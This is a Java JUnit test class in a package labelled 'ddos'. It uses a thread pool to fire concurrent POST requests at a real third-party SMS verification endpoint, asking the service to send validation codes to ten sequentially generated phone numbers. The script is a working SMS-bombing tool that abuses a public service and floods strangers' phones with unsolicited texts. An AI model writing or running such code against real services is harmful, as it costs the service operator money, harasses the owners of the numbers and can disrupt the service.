package com.zq.learn.ddos.act;

import com.alibaba.fastjson.JSON;
import com.zq.learn.ddos.greenpower.GreenPowerResponse;
import org.junit.After;
import org.junit.Before;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.http.HttpEntity;
import org.springframework.http.HttpHeaders;
import org.springframework.http.MediaType;
import org.springframework.test.context.junit4.SpringRunner;
import org.springframework.util.LinkedMultiValueMap;
import org.springframework.util.MultiValueMap;
import org.springframework.web.client.RestTemplate;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.SynchronousQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

/**
 * ${DESCRIPTION}
 *
 * @author qun.zheng
 * @create 2018/1/17
 **/
@RunWith(SpringRunner.class)
@SpringBootTest
public class ActTest {

    @Autowired
    private RestTemplate restTemplate;

    private ThreadPoolExecutor threadPool;

    @Before
    public void setup() {
        threadPool = new ThreadPoolExecutor(
                1, 16, 0, TimeUnit.SECONDS,
                new SynchronousQueue<Runnable>());
    }

    @Test
    public void testSendValidateCode() throws InterruptedException {
        List<String> phoneNums = generatePhoneNums();

        CountDownLatch doneSignal = new CountDownLatch(phoneNums.size());
        phoneNums.forEach(p -> {
            threadPool.execute(new SendValidateTask(p,doneSignal));
        });

        doneSignal.await();
    }

    private class SendValidateTask implements Runnable {

        private String phoneNum;
        private CountDownLatch doneSignal;

        public SendValidateTask(String phoneNum, CountDownLatch doneSignal) {
            this.phoneNum = phoneNum;
            this.doneSignal = doneSignal;
        }

        @Override
        public void run() {
            HttpHeaders headers = new HttpHeaders();
            headers.setContentType(MediaType.APPLICATION_FORM_URLENCODED);

            MultiValueMap<String, String> map = new LinkedMultiValueMap<>();
            map.add("mobile", phoneNum);

            HttpEntity<MultiValueMap<String, String>> request = new HttpEntity<>(map, headers);

            GreenPowerResponse greenPowerResponse = restTemplate.postForObject("http://91greenpower.com/sendShortMsg", request, GreenPowerResponse.class);
            System.out.println(JSON.toJSONString(greenPowerResponse));

            doneSignal.countDown();
        }
    }

    private List<String> generatePhoneNums(){
        List<String> list = new ArrayList<>();
        long startNum = 17751509862l;
        for(int i = 0;i < 10;i++) {
            list.add(String.valueOf(startNum++));
        }
        return list;
    }

    @After

    public void shutdown() {
        threadPool.shutdown();
    }

}
